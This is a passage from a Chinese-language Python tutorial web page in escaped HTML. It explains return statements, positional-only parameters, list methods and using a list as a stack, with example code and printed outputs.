&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;相加后的值为 : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;sum&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
相加后的值为 :  30
相加后的值为 :  40
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;return语句&#34;&gt;&lt;a href=&#34;#return语句&#34; class=&#34;headerlink&#34; title=&#34;return语句&#34;&gt;&lt;/a&gt;return语句&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;return [表达式]&lt;/strong&gt; 语句用于退出函数，选择性地向调用方返回一个表达式&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token comment&#34;&gt;# 可写函数说明&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;sum&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; arg1&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; arg2 &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
   &lt;span class=&#34;token comment&#34;&gt;# 返回2个参数的和.&#34;&lt;/span&gt;
   total &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; arg1 &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; arg2
   &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;函数内 : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; total&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
   &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; total
 
&lt;span class=&#34;token comment&#34;&gt;# 调用sum函数&lt;/span&gt;
total &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token builtin&#34;&gt;sum&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;函数外 : &#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; total&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
函数内 :  30
函数外 :  30
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h3 id=&#34;强制位置参数&#34;&gt;&lt;a href=&#34;#强制位置参数&#34; class=&#34;headerlink&#34; title=&#34;强制位置参数&#34;&gt;&lt;/a&gt;强制位置参数&lt;/h3&gt;&lt;p&gt;函数形参语法 / 用来指明函数形参必须使用指定位置参数，不能使用关键字参数的形式。&lt;/p&gt;
&lt;p&gt;形参 a 和 b 必须使用指定位置参数，c 或 d 可以是位置形参或关键字形参，而 e 和 f 要求为关键字形参&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; b&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; c&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; d&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; e&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; f&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;a&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; b&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; c&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; d&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; e&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; f&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
f&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;10&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;20&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;30&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; d&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;40&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; e&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;50&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; f&lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;60&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
10 20 30 40 50 60
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;数据结构&#34;&gt;&lt;a href=&#34;#数据结构&#34; class=&#34;headerlink&#34; title=&#34;数据结构&#34;&gt;&lt;/a&gt;数据结构&lt;/h2&gt;&lt;h3 id=&#34;列表-1&#34;&gt;&lt;a href=&#34;#列表-1&#34; class=&#34;headerlink&#34; title=&#34;列表&#34;&gt;&lt;/a&gt;列表&lt;/h3&gt;&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&#34;left&#34;&gt;方法&lt;/th&gt;
&lt;th align=&#34;left&#34;&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;list.append(x)&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;把一个元素添加到列表的结尾，相当于 a[len(a):] = [x]。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;list.extend(L)&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;通过添加指定列表的所有元素来扩充列表，相当于 a[len(a):] = L。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;list.insert(i, x)&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;在指定位置插入一个元素。第一个参数是准备插入到其前面的那个元素的索引，例如 a.insert(0, x) 会插入到整个列表之前，而 a.insert(len(a), x) 相当于 a.append(x) 。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;list.remove(x)&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;删除列表中值为 x 的第一个元素。如果没有这样的元素，就会返回一个错误。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;list.pop([i])&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;从列表的指定位置移除元素，并将其返回。如果没有指定索引，a.pop()返回最后一个元素。元素随即从列表中被移除。（方法中 i 两边的方括号表示这个参数是可选的，而不是要求你输入一对方括号，你会经常在 Python 库参考手册中遇到这样的标记。）&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;list.clear()&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;移除列表中的所有项，等于del a[:]。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;list.index(x)&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;返回列表中第一个值为 x 的元素的索引。如果没有匹配的元素就会返回一个错误。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;list.count(x)&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;返回 x 在列表中出现的次数。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;list.sort()&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;对列表中的元素进行排序。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;list.reverse()&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;倒排列表中的元素。&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&#34;left&#34;&gt;list.copy()&lt;/td&gt;
&lt;td align=&#34;left&#34;&gt;返回列表的浅复制，等于a[:]。&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# [1, 2, 1, 5]&lt;/span&gt;
&lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;append&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;999&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# [1, 2, 1, 5, 999]&lt;/span&gt;
list2 &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;44&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;55&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;extend&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;list2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# [1, 2, 1, 5, 999, 44, 55]&lt;/span&gt;
&lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;insert&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;hhhh&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# [1, 2, &#39;hhhh&#39;, 1, 5, 999, 44, 55]&lt;/span&gt;
&lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;remove&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;hhhh&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# [1, 2, 1, 5, 999, 44, 55]&lt;/span&gt;
var &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; list2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;pop&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;var&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 55&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;list2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# [44]&lt;/span&gt;
list2&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;clear&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;list2&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# []&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;index&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 1&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;count&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# 2&lt;/span&gt;
&lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;sort&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# [1, 1, 2, 5, 44, 55, 999]&lt;/span&gt;
&lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;reverse&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# [999, 55, 44, 5, 2, 1, 1]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token builtin&#34;&gt;list&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;copy&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token comment&#34;&gt;# [999, 55, 44, 5, 2, 1, 1]&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
[1, 2, 1, 5]
[1, 2, 1, 5, 999]
[1, 2, 1, 5, 999, 44, 55]
[1, 2, &#39;hhhh&#39;, 1, 5, 999, 44, 55]
[1, 2, 1, 5, 999, 44, 55]
55
[44]
[]
1
2
[1, 1, 2, 5, 44, 55, 999]
[999, 55, 44, 5, 2, 1, 1]
[999, 55, 44, 5, 2, 1, 1]
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;将列表当做堆栈使用&#34;&gt;&lt;a href=&#34;#将列表当做堆栈使用&#34; class=&#34;headerlink&#34; title=&#34;将列表当做堆栈使用&#34;&gt;&lt;/a&gt;将列表当做堆栈使用&lt;/h4&gt;&lt;p&gt;最先进入的元素最后一个被释放（后进先出）。用 append() 方法可以把一个元素添加到堆栈顶。用不指定索引的 pop() 方法可以把一个元素从堆栈顶释放出来。&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;stack &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;3&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;test&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;999&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;stack&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
stack&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;append&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;33&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
stack&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;append&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;44&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
stack&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;append&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;55&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;stack&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;stack&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;pop&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;stack&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;pop&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;token keyword&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;stack&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;

&lt;span class=&#34;token triple-quoted-string string&#34;&gt;&#39;&#39;&#39;
[1, 3, &#39;test&#39;, &#39;999&#39;]
[1, 3, &#39;test&#39;, &#39;999&#39;, 33, 44, 55]
55
44
[1, 3, &#39;test&#39;, &#39;999&#39;, 33]
&#39;&#39;&#39;&lt;/span&gt;&lt;span aria-hidden=&#34;true&#34; class=&#34;line-numbers-rows&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;将列表当作队列使用&#34;&gt;&lt;a href=&#34;#将列表当作队列使用&#34; class=&#34;headerlink&#34; title=&#34;将列表当作队列使用&#34;&gt;&lt;/a&gt;将列表当作队列使用&lt;/h4&gt;&lt;p&gt;队列里第一加入的元素，第一个取出来&lt;/p&gt;
&lt;pre class=&#34;line-numbers language-python&#34; data-language=&#34;python&#34;&gt;&lt;code class=&#34;language-python&#34;&gt;&lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; collections &lt;span class=&#34;token keyword&#34;&gt;import&lt;/span&gt; deque
